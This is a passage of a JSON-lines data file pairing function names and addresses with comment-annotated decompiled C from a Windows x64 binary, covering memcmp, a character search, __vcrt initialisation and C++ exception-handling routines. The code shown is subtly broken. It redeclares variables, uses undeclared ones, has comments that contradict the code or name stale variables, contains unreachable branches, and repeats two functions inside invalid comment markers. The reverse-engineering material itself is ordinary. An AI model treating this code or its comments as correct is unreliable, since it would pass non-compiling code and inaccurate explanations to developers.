(ushort)(SUB161(comparison_results >> 0x6f, 0) & 1) << 0xd |\n                     (ushort)(SUB161(comparison_results >> 0x77, 0) & 1) << 0xe | (ushort)(comparison_results[0xf] >> 7) << 0xf;\n\n            match_index = 0; // Initialize the index for the matching character\n            // Find the first matching character\n            if (match_result != 0) {\n                for (; (match_result >> match_index & 1) == 0; match_index++) {} // Increment lVar1 until a match is found\n            }\n            // If a match was found, return the pointer to the matching character in param_1\n            if (match_result != 0) {\n                return input_string + match_index - 0x10; // Adjust pointer to the correct position\n            }\n            input_string += 0x10; // Move to the next block of 16 characters\n            remaining_chars -= 0x10; // Decrease the count of remaining characters to check\n        } while (0xf < remaining_chars); // Continue while there are more than 15 characters left\n    }\n\n    // Check remaining characters one by one\n    while (remaining_chars != 0) {\n        if (*input_string == (char)comparison_char) break; // Break if a match is found\n        input_string++; // Move to the next character\n        remaining_chars--; // Decrease the count of remaining characters\n    }\n    // Return NULL if no match was found, otherwise return the pointer to the matching character\n    return remaining_chars == 0 ? (char *)0x0 : input_string;\n}\n"}
{"Function Name": "memcmp", "Address": "14000c980", "Source Code": "\nint __cdecl memcmp(void *buffer1, void *buffer2, size_t size)\n{\n    // Calculate the difference in memory addresses between the two buffers\n    longlong addressDifference = (longlong)buffer2 - (longlong)buffer1;\n\n    // Check if the size is greater than 7 bytes\n    if (size > 7) {\n        // Get the alignment of the first buffer\n        ulonglong alignment = (ulonglong)buffer1 & 7;\n\n        // Process any unaligned bytes at the start\n        while (alignment != 0) {\n            // Compare the first byte of each buffer\n            bool isLessThan = (byte)*buffer1 < *(byte *)((longlong)buffer1 + addressDifference);\n            // If the bytes are not equal, return the comparison result\n            if ((byte)*buffer1 != *(byte *)((longlong)buffer1 + addressDifference)) \n                return (1 - (uint)isLessThan) - (uint)(isLessThan != 0);\n            // Move to the next byte\n            buffer1 = (void *)((longlong)buffer1 + 1);\n            size--;\n            // Update the alignment check\n            alignment = (ulonglong)buffer1 & 7;\n        }\n\n        // Process the main block of data in chunks of 32 bytes\n        if (size >> 3 != 0) {\n            ulonglong alignment = size >> 5;\n            while (alignment != 0) {\n                // Compare 8 bytes from each buffer\n                ulonglong dataChunk = *buffer1;\n                if (dataChunk != *(ulonglong *)((longlong)buffer1 + addressDifference)) \n                    return (1 - (uint)((dataChunk < *(ulonglong *)((longlong)buffer1 + addressDifference)))) - (uint)(dataChunk != *(ulonglong *)((longlong)buffer1 + addressDifference));\n                // Move to the next 8 bytes\n                buffer1 = (void *)((longlong)buffer1 + 8);\n                alignment--;\n            }\n            // Update the remaining size to process\n            size &= 0x1f;\n        }\n\n        // Process any remaining bytes in chunks of 8 bytes\n        ulonglong alignment = size >> 3;\n        while (alignment != 0) {\n            ulonglong dataChunk = *buffer1;\n            if (dataChunk != *(ulonglong *)((longlong)buffer1 + addressDifference)) \n                return (1 - (uint)((dataChunk < *(ulonglong *)((longlong)buffer1 + addressDifference)))) - (uint)(dataChunk != *(ulonglong *)((longlong)buffer1 + addressDifference));\n            // Move to the next 8 bytes\n            buffer1 = (void *)((longlong)buffer1 + 8);\n            alignment--;\n        }\n        // Update the remaining size to process\n        size &= 7;\n    }\n\n    // Process any remaining bytes one by one\n    while (size != 0) {\n        // Compare the current byte of each buffer\n        bool isLessThan = (byte)*buffer1 < *(byte *)((longlong)buffer1 + addressDifference);\n        // If the bytes are not equal, return the comparison result\n        if ((byte)*buffer1 != *(byte *)((longlong)buffer1 + addressDifference)) \n            return (1 - (uint)isLessThan) - (uint)(isLessThan != 0);\n        // Move to the next byte\n        buffer1 = (void *)((longlong)buffer1 + 1);\n        size--;\n    }\n\n    // If all bytes are equal, return 0\n    return 0;\n}\n"}
{"Function Name": "__vcrt_initialize", "Address": "14000ca48", "Source Code": "\nulonglong __vcrt_initialize(void)\n{\n    ulonglong returnValue; // Variable to hold the return value of initialization functions\n    initializeFunction(); // Call to a specific initialization function\n    initializeWinApiThunks(); // Initialize Windows API thunks\n    returnValue = initializeLocks(); // Initialize locks and store the result in uVar2\n    if ((char)returnValue != '\\0') { // Check if lock initialization was successful\n        if ((char)initializeThreadLocalData() != '\\0') { // Check if thread-local data initialization was successful\n            return combineValues((int7)(combineValuesWithZero(0, initializeThreadLocalData()) >> 8), 1); // Return a combined value indicating success\n        }\n        returnValue = uninitializeLocks(); // Uninitialize locks if thread-local data initialization failed\n    }\n    return returnValue & 0xffffffffffffff00; // Return the result masked to the appropriate bits\n}\n"}
{"Function Name": "__vcrt_uninitialize", "Address": "14000ca7c", "Source Code": "\nundefined8 __vcrt_uninitialize(char inputChar)\n{\n    // Check if the input parameter is null character\n    if (inputChar == '\\0') {\n        // Call function to uninitialize thread data\n        uninitializeThreadData();\n        // Call function to uninitialize locks\n        uninitializeLocks();\n        // Return a concatenated value from uninitialize_winapi_thunks and 1\n        return concatenateValues((int7)((ulonglong)uninitializeWinApiThunks('\\0') >> 8), 1);\n    }\n    // Return 0 if param_1 is not null character\n    return 0; // Assuming a default return value when param_1 is not '\\0'\n}\n"}
{"Function Name": "__C_specific_handler", "Address": "14000ca9c", "Source Code": "\nEXCEPTION_DISPOSITION\n__C_specific_handler\n(_EXCEPTION_RECORD *ExceptionRecord, void *EstablisherFrame, _CONTEXT *ContextRecord,\n_DISPATCHER_CONTEXT *DispatcherContext)\n{\n    longlong lVar1; // Variable to store a long long value from DispatcherContext\n    uint *puVar2; // Pointer to an array of unsigned integers from DispatcherContext\n    int iVar3; // Variable to store the return value of a function call\n    BOOL BVar4; // Variable to store a boolean value (not used in this snippet)\n    ulonglong uVar5; // Variable to store an unsigned long long value (not used in this snippet)\n    ulonglong uVar8; // Variable to store an unsigned long long value for loop iteration\n    uint uVar9; // Variable to store an unsigned integer for loop control\n    ulonglong uVar10; // Variable to store an unsigned long long value (not used in this snippet)\n    uint uVar11; // Variable to store an unsigned integer (not used in this snippet)\n    ulonglong uVar12; // Variable to store an unsigned long long value (not used in this snippet)\n    uint uVar13; // Variable to store an unsigned integer for flags\n    ulonglong uVar14; // Variable to store an unsigned long long value for calculations\n    _EXCEPTION_RECORD *local_38 = ExceptionRecord; // Local copy of the ExceptionRecord pointer\n\n    __except_validate_context_record((longlong)ContextRecord); // Validate the context record\n\n    lVar1 = *(longlong *)(DispatcherContext + 8); // Retrieve a long long value from DispatcherContext\n    puVar2 = *(uint **)(DispatcherContext + 0x38); // Retrieve a pointer to an array of unsigned integers\n    uVar14 = *(longlong *)DispatcherContext - lVar1; // Calculate an offset value\n    uVar9 = *(uint *)(DispatcherContext + 0x48); // Retrieve a value from DispatcherContext\n\n    // Check if the exception flags do not match certain criteria\n    if ((ExceptionRecord->ExceptionFlags & 0x66) == 0) {\n        // Loop through the range defined by uVar9 and the value pointed to by puVar2\n        for (uVar7 = uVar9; uVar7 < *puVar2; uVar7++) {\n            uVar8 = (ulonglong)uVar7; // Convert loop index to ulonglong\n            // Check if the exception record falls within the specified range\n            if ((puVar2[uVar8 * 4 + 1] <= uVar14) && (uVar14 < puVar2[uVar8 * 4 + 2]) && (puVar2[uVar8 * 4 + 4] != 0)) {\n                // Check if the handler is not a specific value\n                if (puVar2[uVar8 * 4 + 3] != 1) {\n                    // Call the handler function and check the return value\n                    iVar3 = (*(code *)((ulonglong)puVar2[uVar8 * 4 + 3] + lVar1))(&local_38, EstablisherFrame);\n                    if (iVar3 < 0) {\n                        return ExceptionContinueExecution; // Continue execution if negative return value\n                    }\n                    if (iVar3 < 1) goto LAB_14000cbb6; // Jump to label if return value is less than 1\n                }\n                // Check for a specific exception code and destruct the exception object if necessary\n                if ((ExceptionRecord->ExceptionCode == 0xe06d7363) && (PTR___DestructExceptionObject_140025e18 != (undefined *)0x0) &&\n                    _IsNonwritableInCurrentImage((PBYTE)&PTR___DestructExceptionObject_140025e18)) {\n                    (*(code *)PTR___DestructExceptionObject_140025e18)(ExceptionRecord, 1); // Destruct the exception object\n                }\n                _NLG_Notify(); // Notify the non-local goto handler\n                // Unwind the stack and handle the exception\n                RtlUnwindEx(EstablisherFrame, (PVOID)((ulonglong)puVar2[uVar8 * 4 + 4] + lVar1),\n                            ExceptionRecord, (PVOID)(ulonglong)ExceptionRecord->ExceptionCode,\n                            *(PCONTEXT *)(DispatcherContext + 0x28),\n                            *(PUNWIND_HISTORY_TABLE *)(DispatcherContext + 0x40));\n                FUN_14000e8e0(); // Call a function (not specified)\n            }\nLAB_14000cbb6: // Label for control flow\n        }\n    } else {\n        uVar10 = (ulonglong)*puVar2; // Store the value pointed to by puVar2\n        uVar8 = *(longlong *)(DispatcherContext + 0x20) - lVar1; // Calculate another offset\n        // Check if uVar9 is less than the value pointed to by puVar2\n        if (uVar9 < *puVar2) {\n            do {\n                uVar6 = (ulonglong)uVar9; // Convert loop index to ulonglong\n                // Check if the exception record falls within the specified range\n                if ((puVar2[uVar6 * 4 + 1] <= uVar14) && (uVar14 < puVar2[uVar6 * 4 + 2])) {\n                    uVar13 = ExceptionRecord->ExceptionFlags & 0x20; // Check specific flags\n                    if (uVar13 != 0) {\n                        uVar12 = 0; // Initialize a counter\n                        // Loop through the range to find a matching entry\n                        while (uVar12 < (ulonglong)*puVar2) {\n                            if ((puVar2[uVar12 * 4 + 1] <= uVar8) && (uVar8 < puVar2[uVar12 * 4 + 2]) &&\n                                (puVar2[uVar12 * 4 + 4] == puVar2[uVar6 * 4 + 4]) &&\n                                (puVar2[uVar12 * 4 + 3] == puVar2[uVar6 * 4 + 3])) break; // Break if a match is found\n                            uVar12++; // Increment counter\n                        }\n                        // Check if the found index does not match the expected index\n                        if ((int)uVar12 != (int)uVar10) {\n                            return ExceptionContinueSearch; // Continue searching if not matched\n                        }\n                    }\n                    // Check if the handler is null\n                    if (puVar2[uVar6 * 4 + 4] == 0) {\n                        *(uint *)(DispatcherContext + 0x48) = uVar9 + 1; // Update the DispatcherContext\n                        // Call the handler function with specific parameters\n                        (*(code *)((ulonglong)puVar2[uVar6 * 4 + 3] + lVar1))\n                        (CONCAT71((int7)(uVar10 >> 8), 1), EstablisherFrame);\n                        uVar10 = (ulonglong)*puVar2; // Update uVar10\n                    } else if ((uVar8 == puVar2[uVar6 * 4 + 4]) && (uVar13 != 0)) {\n                        return ExceptionContinueSearch; // Continue searching if conditions are met\n                    }\n                }\n                uVar9++; // Increment loop control variable\n            } while (uVar9 < (uint)uVar10); // Continue loop while within bounds\n        }\n    }\n    return ExceptionContinueSearch; // Return to continue searching for the exception handler\n}\n"}
{"Function Name": "__std_type_info_compare", "Address": "14000cca8", "Source Code": "\nuint __std_type_info_compare(longlong first_array_start, longlong second_array_start)\n{\n    byte current_byte; // Variable to hold the current byte being compared\n    byte *first_array_pointer = (byte *)(first_array_start + 9); // Pointer to the byte array starting from param_1 + 9\n    longlong offset_difference = (second_array_start + 9) - (longlong)first_array_pointer; // Calculate the offset difference between the two byte arrays\n\n    if (first_array_start != second_array_start) { // Check if the two parameters are not the same\n        do {\n            current_byte = *first_array_pointer; // Get the current byte from the first byte array\n            if (current_byte != first_array_pointer[offset_difference]) { // Compare the current byte with the corresponding byte in the second array\n                return -(uint)(current_byte < first_array_pointer[offset_difference]) | 1; // Return comparison result based on the byte values\n            }\n            first_array_pointer++; // Move to the next byte in the first byte array\n        } while (current_byte != 0); // Continue until a null byte is encountered\n    }\n    return 0; // Return 0 if the two byte arrays are equal\n}\n"}
{"Function Name": "FUN_14000ccd0", "Address": "14000ccd0", "Source Code": "\nvoid checkAndCallFunction(undefined *inputPointer)\n{\n    // Check if param_1 is not null and not equal to the specific address\n    if (inputPointer != (undefined *)0x0 && inputPointer != &specificAddress) {\n        // Call the function FUN_14000ead0 with param_1 as an argument\n        processInput(inputPointer);\n    }\n}\n"}
{"Function Name": "__vcrt_getptd", "Address": "14000ccf0", "Source Code": "\nvoid get_thread_data(void) // Function declaration for __vcrt_getptd\n{\n    // Check if __vcrt_getptd_noexit returns a null pointer\n    if (get_thread_data_noexit() == (LPVOID)0x0) {\n        terminate_program(); // Terminate the program if the pointer is null\n    }\n}\n"}
{"Function Name": "__vcrt_getptd_noexit", "Address": "14000cd0c", "Source Code": "\nLPVOID __vcrt_getptd_noexit(void) // Function to get a pointer to thread data without exiting\n{\n    DWORD errorCode; // Variable to store the last error code\n    LPVOID threadLocalValue; // Variable to hold the value retrieved from the thread-local storage\n    LPVOID newThreadDataPointer = (LPVOID)0x0; // Initialize pointer for new thread data to NULL\n\n    if (DAT_1400380b0 != 0xffffffff) { // Check if the thread-local storage index is valid\n        errorCode = GetLastError(); // Save the current error code\n        threadLocalValue = (LPVOID)__vcrt_FlsGetValue(DAT_1400380b0); // Retrieve the value from thread-local storage\n\n        if (threadLocalValue != (LPVOID)0xffffffffffffffff && threadLocalValue == (LPVOID)0x0) { // Check if the value is valid and NULL\n            if (__vcrt_FlsSetValue(DAT_1400380b0, (LPVOID)0xffffffffffffffff) != 0) { // Set a temporary value to indicate allocation in progress\n                newThreadDataPointer = _calloc_base(1, 0x80); // Allocate memory for thread data\n                if (newThreadDataPointer == (LPVOID)0x0 || __vcrt_FlsSetValue(DAT_1400380b0, newThreadDataPointer) == 0) { // Check if allocation failed or setting value failed\n                    __vcrt_FlsSetValue(DAT_1400380b0, (LPVOID)0x0); // Reset the thread-local storage value to NULL\n                } else {\n                    *(undefined4 *)((longlong)newThreadDataPointer + 0x78) = 0xfffffffe; // Set a specific value in the allocated memory\n                }\n            }\n            FUN_14000ead0(threadLocalValue); // Call a function with the old thread data value\n        }\n        SetLastError(errorCode); // Restore the original error code\n    }\n    return newThreadDataPointer; // Return the pointer to the thread data\n}\n"}
{"Function Name": "__vcrt_getptd_noinit", "Address": "14000cdcc", "Source Code": "\nlonglong __vcrt_getptd_noinit(void) // Function declaration\n{\n    longlong result; // Variable to store the result\n    if (global_variable == -1) { // Check if the global variable is -1\n        result = 0; // Set lVar1 to 0 if the condition is true\n    } else {\n        result = __vcrt_FlsGetValue(global_variable); // Retrieve value using the global variable\n        if (result == -1) { // Check if the retrieved value is -1\n            result = 0; // Set lVar1 to 0 if the retrieved value is -1\n        }\n    }\n    return result; // Return the final value of lVar1\n}\n"}
{"Function Name": "__vcrt_initialize_ptd", "Address": "14000ce1c", "Source Code": "\nuint __vcrt_initialize_ptd(void) // Function to initialize a thread-local storage (TLS) descriptor\n{\n    uint flsIndex = __vcrt_FlsAlloc(FUN_14000ccd0); // Allocate a new fiber-local storage (FLS) index\n    globalFlsIndex = flsIndex; // Store the allocated FLS index in a global variable\n    if (flsIndex != 0xffffffff) { // Check if the allocation was successful\n        if (__vcrt_FlsSetValue(flsIndex, &flsValue) != 0) { // Set the value for the allocated FLS index\n            statusFlag = 0xfffffffe; // Indicate that the value was set successfully\n            return 1; // Return success\n        }\n        __vcrt_uninitialize_ptd(); // Uninitialize if setting the value failed\n    }\n    return flsIndex & 0xffffff00; // Return the FLS index masked to indicate failure if necessary\n}\n"}
{"Function Name": "__vcrt_uninitialize_ptd", "Address": "14000ce64", "Source Code": "\nundefined1 __vcrt_uninitialize_ptd(void)\n{\n    // Check if the global variable DAT_1400380b0 is not equal to -1\n    if (thread_local_storage_id != -1) {\n        // Free the resources associated with the thread-local storage identifier\n        __vcrt_FlsFree(thread_local_storage_id);\n    }\n    // Set the global variable DAT_1400380b0 to -1 to indicate uninitialization\n    thread_local_storage_id = -1;\n    // Return 1 to indicate successful uninitialization\n    return 1;\n}\n"}
{"Function Name": "__FrameHandler3::GetCurrentState", "Address": "14000ce88", "Source Code": "\nint __cdecl\n__FrameHandler3::GetCurrentState\n(__uint64 *param_1, _xDISPATCHER_CONTEXT *param_2, _s_FuncInfo *param_3)\n{\n    // Retrieve the current state using the unwind help pointer and the value pointed by param_1\n    int iVar1 = *(int *)((longlong)param_3->dispUnwindHelp + *param_1);\n    \n    // Check if the retrieved state is -2, indicating a special case\n    if (iVar1 == -2) {\n        // Call StateFromIp to get the state based on the function info and dispatcher context\n        iVar1 = StateFromIp(param_3, param_2, *(__uint64 *)param_2);\n    }\n    \n    // Return the determined state\n    return iVar1;\n}\n"}
{"Function Name": "__FrameHandler3::GetUnwindTryBlock", "Address": "14000ceb0", "Source Code": "\nint __cdecl\n__FrameHandler3::GetUnwindTryBlock\n(__uint64 *param_1, _xDISPATCHER_CONTEXT *param_2, _s_FuncInfo *param_3)\n{\n    __uint64 *p_Var1; // Declare a pointer to hold the result of GetEstablisherFrame\n    p_Var1 = GetEstablisherFrame(param_1, param_2, param_3, NULL); // Call GetEstablisherFrame with provided parameters\n    return *(int *)((longlong)param_3->dispUnwindHelp + 4 + *p_Var1); // Return the integer value from the calculated address\n}\n"}
{"Function Name": "__FrameHandler3::SetState", "Address": "14000cedc", "Source Code": "\nvoid __cdecl __FrameHandler3::SetState(__uint64 *unwindHelpPointer, _s_FuncInfo *funcInfo, int stateValue)\n{\n    // Dereference the pointer to the unwind help structure and add the value pointed by param_1\n    // to access the specific state location.\n    // Set the value at that location to param_3.\n    *(int *)((longlong)funcInfo->dispUnwindHelp + *unwindHelpPointer) = stateValue;\n}\n"}
{"Function Name": "__FrameHandler3::SetUnwindTryBlock", "Address": "14000cee8", "Source Code": "\nvoid __cdecl\n__FrameHandler3::SetUnwindTryBlock\n(__uint64 *param_1, _xDISPATCHER_CONTEXT *param_2, _s_FuncInfo *param_3, int param_4)\n{\n    __uint64 *p_Var1; // Declare a pointer to hold the established frame\n\n    // Get the establisher frame using the provided parameters\n    p_Var1 = GetEstablisherFrame(param_1, param_2, param_3, NULL);\n\n    // Check if the value at the calculated address is less than param_4\n    if (*(int *)((longlong)param_3->dispUnwindHelp + 4 + *p_Var1) < param_4) {\n        // Update the value at the calculated address to param_4\n        *(int *)((longlong)param_3->dispUnwindHelp + 4 + *p_Var1) = param_4;\n    }\n\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14000cf24", "Address": "14000cf24", "Source Code": "\nvoid FUN_14000cf24(_s_FuncInfo *func_info, _xDISPATCHER_CONTEXT *dispatcher_context)\n{\n    // Call the StateFromIp function from the __FrameHandler3 class\n    // Pass the function info and dispatcher context along with the value \n    // pointed to by param_2, cast to an unsigned 64-bit integer\n    __FrameHandler3::StateFromIp(func_info, dispatcher_context, *(__uint64 *)dispatcher_context);\n}\n"}
{"Function Name": "__FrameHandler3::StateFromIp", "Address": "14000cf2c", "Source Code": "\nint __cdecl\n__FrameHandler3::StateFromIp(_s_FuncInfo *param_1,_xDISPATCHER_CONTEXT *param_2,__uint64 param_3)\n{\n    longlong lVar1; // Variable to hold a long long value from the dispatcher context\n    ulonglong uVar5; // Variable to hold an unsigned long long for indexing\n    longlong lVar6; // Variable to hold a long long value for the IP to state map\n\n    // Check if the function info parameter is not null\n    if (param_1 != (_s_FuncInfo *)0x0) {\n        lVar6 = (longlong)(int)param_1->dispIPToStateMap; // Get the IP to state map address\n        lVar1 = *(longlong *)(param_2 + 8); // Retrieve the value from the dispatcher context\n        // Check if the sum of the map address and the dispatcher value is not zero\n        if (lVar6 + lVar1 != 0) {\n            uVar5 = 0; // Initialize the index variable\n            // Check if there are any entries in the IP map\n            if (param_1->nIPMapEntries != 0) {\n                do {\n                    // Compare the input parameter with the current entry in the IP map\n                    if (param_3 < (ulonglong)(*(int *)(lVar6 + uVar5 * 8 + lVar1) + lVar1)) break; // Break if the condition is met\n                    uVar5++; // Increment the index\n                } while (uVar5 < param_1->nIPMapEntries); // Continue until all entries are checked\n                // If at least one valid entry was found\n                if (uVar5 != 0) {\n                    return *(int *)(lVar6 + (uVar5 - 1) * 8 + 4 + lVar1); // Return the corresponding state\n                }\n            }\n            return -1; // Return -1 if no valid state was found\n        }\n    }\n    terminate(); // Call terminate if the function info is null or the map is invalid\n    return (*(code *)swi(3))(); // Call a system interrupt and return its result\n}\n"}
{"Function Name": "FUN_14000cf94", "Address": "14000cf94", "Source Code": "\nulonglong FUN_14000cf94(longlong imageBase,longlong *outputPointer,byte *inputBuffer,byte *flags)\n{\n    longlong baseAddress; // Variable to hold a longlong value\n    longlong initialValue; // Variable to hold a longlong value\n    ulonglong result; // Variable to hold an unsigned longlong value\n    int counter1; // Variable to hold an integer value\n    int offsetValue; // Variable to hold an integer value\n\n    initialValue = 0; // Initialize lVar4 to 0\n    counter1 = 0; // Initialize iVar6 to 0\n    baseAddress = initialValue; // Set lVar2 to the value of lVar4\n    offsetValue = *(int *)(inputBuffer + 4); // Get the integer value from param_3 offset by 4\n\n    if (offsetValue != 0) { // Check if iVar7 is not zero\n        baseAddress = _GetImageBase() + offsetValue; // Calculate the image base address\n    }\n\n    // Check for various conditions to determine if the function should return 0\n    if (baseAddress == 0 || (*(char *)(baseAddress + 0x10) == '\\0') || ((*(int *)(inputBuffer + 8) == 0) && (-1 < *(int *)inputBuffer))) || (-1 < *(int *)inputBuffer)) {\n        return 0; // Return 0 if any condition is met\n    }\n\n    if (-1 < *(int *)inputBuffer) { // Check if the value pointed by param_3 is non-negative\n        outputPointer = (longlong *)((longlong)*(int *)(inputBuffer + 8) + *outputPointer); // Adjust param_2 based on the value from param_3\n    }\n\n    // Check for specific flags in param_3 and param_4\n    if ((((*inputBuffer & 0x80) == 0) || ((*flags & 0x10) == 0)) || (DAT_140039c38 == 0)) {\n        if ((*inputBuffer & 8) != 0) { // Check if a specific flag is set in param_3\n            baseAddress = *(longlong *)(imageBase + 0x28); // Get a value from param_1\n            if (baseAddress != 0 && outputPointer != (longlong *)0x0) { // Check if lVar2 is non-zero and param_2 is not null\n                *outputPointer = baseAddress; // Assign lVar2 to the location pointed by param_2\n                *outputPointer = __AdjustPointer(baseAddress,(int *)(flags + 8)); // Adjust the pointer and assign it to param_2\n                return 0; // Return 0\n            }\n            terminate(); // Call terminate if conditions are not met\n        }\n\n        if ((*flags & 1) != 0) { // Check if a specific flag is set in param_4\n            if ((*(undefined8 **)(imageBase + 0x28) != (undefined8 *)0x0) && (outputPointer != (longlong *)0x0)) { // Check if a value from param_1 is not null and param_2 is not null\n                FUN_14000c330(outputPointer,*(undefined8 **)(imageBase + 0x28),(longlong)*(int *)(flags + 0x14)); // Call another function with parameters\n                if (*(int *)(flags + 0x14) != 8 || *outputPointer == 0) { // Check conditions on param_4\n                    return 0; // Return 0 if conditions are met\n                }\n                return 0; // Return 0\n            }\n            terminate(); // Call terminate if conditions are not met\n        }\n\n        baseAddress = _GetThrowImageBase() + *(int *)(flags + 0x18); // Calculate another base address\n        if (baseAddress != 0) { // Check if lVar2 is non-zero\n            if ((*(longlong *)(imageBase + 0x28) != 0) && (outputPointer != (longlong *)0x0)) { // Check if a value from param_1 is non-zero and param_2 is not null\n                return (ulonglong)(((*flags & 4) != 0) + 1); // Return a calculated value based on param_4\n            }\n            terminate(); // Call terminate if conditions are not met\n        }\n\n        if ((*(longlong *)(imageBase + 0x28) != 0) && (outputPointer != (longlong *)0x0)) { // Check if a value from param_1 is non-zero and param_2 is not null\n            FUN_14000c330(outputPointer,(undefined8 *)__AdjustPointer(*(longlong *)(imageBase + 0x28),(int *)(flags + 8)),(longlong)*(int *)(flags + 0x14)); // Call another function with parameters\n            return 0; // Return 0\n        }\n    }\n    else { // If the previous conditions were not met\n        baseAddress = (*(code *)PTR__guard_dispatch_icall_1400213e8)(); // Call a function pointer\n        if (baseAddress != 0 && outputPointer != (longlong *)0x0) { // Check if lVar2 is non-zero and param_2 is not null\n            *outputPointer = baseAddress; // Assign lVar2 to the location pointed by param_2\n            *outputPointer = __AdjustPointer(baseAddress,(int *)(flags + 8)); // Adjust the pointer and assign it to param_2\n            return 0; // Return 0\n        }\n        terminate(); // Call terminate if conditions are not met\n    }\n    terminate(); // Call terminate at the end of the function\n    pcVar1 = (code *)swi(3); // Call a software interrupt\n    result = (*pcVar1)(); // Execute the function pointed by pcVar1\n    return result; // Return the result\n}\n"}
{"Function Name": "BuildCatchObjectInternal<class___FrameHandler3>", "Address": "14000d194", "Source Code": "\\*\nvoid __cdecl\nBuildCatchObjectInternal<class___FrameHandler3>\n(EHExceptionRecord *param_1, void *param_2, _s_HandlerType *param_3,\n_s_CatchableType *param_4)\n{\n    ulonglong uVar1; // Variable to store the result of a function call\n    void *pvVar5;   // Pointer to the catch object\n    void *pvVar2;   // Pointer for member function call\n    longlong lVar3; // Adjusted pointer for the catchable type\n    undefined *UNRECOVERED_JUMPTABLE = (undefined *)0x0; // Pointer for unrecovered jump table\n\n    pvVar5 = param_2; // Initialize catch object pointer with param_2\n    if (-1 < (int)param_3->adjectives) { // Check if adjectives are valid\n        pvVar5 = (void *)((longlong)param_3->dispCatchObj + *param_2); // Adjust catch object pointer\n    }\n    \n    uVar1 = FUN_14000cf94((longlong)param_1, (longlong *)param_2, (byte *)param_3, (byte *)param_4); // Call function to get status\n\n    if ((int)uVar1 == 1) { // Check if status indicates first case\n        lVar3 = __AdjustPointer(*(longlong *)(param_1 + 0x28), (int *)(param_4 + 8)); // Adjust pointer based on exception record\n        if (*(int *)(param_4 + 0x18) != 0) { // Check if jump table is valid\n            UNRECOVERED_JUMPTABLE = (undefined *)(*(int *)(param_4 + 0x18) + _GetThrowImageBase()); // Set jump table pointer\n        }\n        FUN_14000e410(pvVar5, UNRECOVERED_JUMPTABLE, lVar3); // Call function with adjusted pointers\n    } else if ((int)uVar1 == 2) { // Check if status indicates second case\n        pvVar2 = (void *)__AdjustPointer(*(longlong *)(param_1 + 0x28), (int *)(param_4 + 8)); // Adjust pointer for member function call\n        if (*(int *)(param_4 + 0x18) != 0) { // Check if jump table is valid\n            UNRECOVERED_JUMPTABLE = (undefined *)(*(int *)(param_4 + 0x18) + _GetThrowImageBase()); // Set jump table pointer\n        }\n        _CallMemberFunction2(pvVar5, UNRECOVERED_JUMPTABLE, pvVar2, 1); // Call member function with adjusted pointers\n    }\n    return; // End of function\n}\n*\\ \n \n\nvoid __cdecl\nBuildCatchObjectInternal<class___FrameHandler3>\n(EHExceptionRecord *param_1, void *param_2, _s_HandlerType *param_3,\n_s_CatchableType *param_4)\n{\n    ulonglong uVar1;\n    void *pvVar5;\n    void *pvVar2;\n    longlong lVar3;\n    undefined *UNRECOVERED_JUMPTABLE = (undefined *)0x0;\n\n    pvVar5 = param_2;\n    if (-1 < (int)param_3->adjectives) {\n        pvVar5 = (void *)((longlong)param_3->dispCatchObj + *param_2);\n    }\n    \n    uVar1 = FUN_14000cf94((longlong)param_1, (longlong *)param_2, (byte *)param_3, (byte *)param_4);\n    \n    if ((int)uVar1 == 1) {\n        lVar3 = __AdjustPointer(*(longlong *)(param_1 + 0x28), (int *)(param_4 + 8));\n        if (*(int *)(param_4 + 0x18) != 0) {\n            UNRECOVERED_JUMPTABLE = (undefined *)(*(int *)(param_4 + 0x18) + _GetThrowImageBase());\n        }\n        FUN_14000e410(pvVar5, UNRECOVERED_JUMPTABLE, lVar3);\n    } else if ((int)uVar1 == 2) {\n        pvVar2 = (void *)__AdjustPointer(*(longlong *)(param_1 + 0x28), (int *)(param_4 + 8));\n        if (*(int *)(param_4 + 0x18) != 0) {\n            UNRECOVERED_JUMPTABLE = (undefined *)(*(int *)(param_4 + 0x18) + _GetThrowImageBase());\n        }\n        _CallMemberFunction2(pvVar5, UNRECOVERED_JUMPTABLE, pvVar2, 1);\n    }\n    return;\n}\n"}
{"Function Name": "CatchIt<class___FrameHandler3>", "Address": "14000d254", "Source Code": "\\*\nvoid __cdecl\nCatchIt<class___FrameHandler3>\n(EHExceptionRecord *param_1,__uint64 *param_2,_CONTEXT *param_3,\n_xDISPATCHER_CONTEXT *param_4,_s_FuncInfo *param_5,_s_HandlerType *param_6,\n_s_CatchableType *param_7,_s_TryBlockMapEntry *param_8,int param_9,__uint64 *param_10,\nuchar param_11,uchar param_12)\n{\n    __uint64 *p_Var3; // Pointer to the established frame\n    longlong lVar4;   // Variable to hold the image base address\n    __uint64 local_res10; // Local variable to store result from GetEstablisherFrame\n    \n    // Get the establisher frame using the provided parameters\n    p_Var3 = __FrameHandler3::GetEstablisherFrame(param_2,param_4,param_5,&local_res10);\n    \n    // Check if the catchable type is not null\n    if (param_7 != (_s_CatchableType *)0x0) {\n        // Build the catch object internally if the catchable type is valid\n        BuildCatchObjectInternal<class___FrameHandler3>(param_1,p_Var3,param_6,param_7);\n    }\n    \n    // Retrieve the base address of the image\n    lVar4 = _GetImageBase();\n    \n    // Call the function to handle the exception with the necessary parameters\n    FUN_14000bd94(param_2,(ULONG_PTR)param_1,(ULONG_PTR)param_3,(ULONG_PTR)p_Var3,\n                  lVar4 + (int)param_6->dispOfHandler,(ULONG_PTR)param_5,\n                  param_8->tryLow,CONCAT44(param_8->catchHigh,0),param_6,\n                  (undefined8 *)param_4,param_12);\n    \n    return; // Exit the function\n}\n*\\ \n \n\nvoid __cdecl\nCatchIt<class___FrameHandler3>\n(EHExceptionRecord *param_1,__uint64 *param_2,_CONTEXT *param_3,\n_xDISPATCHER_CONTEXT *param_4,_s_FuncInfo *param_5,_s_HandlerType *param_6,\n_s_CatchableType *param_7,_s_TryBlockMapEntry *param_8,int param_9,__uint64 *param_10,\nuchar param_11,uchar param_12)\n{\n    __uint64 *p_Var3;\n    longlong lVar4;\n    __uint64 local_res10;\n    \n    p_Var3 = __FrameHandler3::GetEstablisherFrame(param_2,param_4,param_5,&local_res10);\n    if (param_7 != (_s_CatchableType *)0x0) {\n        BuildCatchObjectInternal<class___FrameHandler3>(param_1,p_Var3,param_6,param_7);\n    }\n    lVar4 = _GetImageBase();\n    FUN_14000bd94(param_2,(ULONG_PTR)param_1,(ULONG_PTR)param_3,(ULONG_PTR)p_Var3,\n                  lVar4 + (int)param_6->dispOfHandler,(ULONG_PTR)param_5,\n                  param_8->tryLow,CONCAT44(param_8->catchHigh,0),param_6,\n                  (undefined8 *)param_4,param_12);\n    return;\n}\n"}
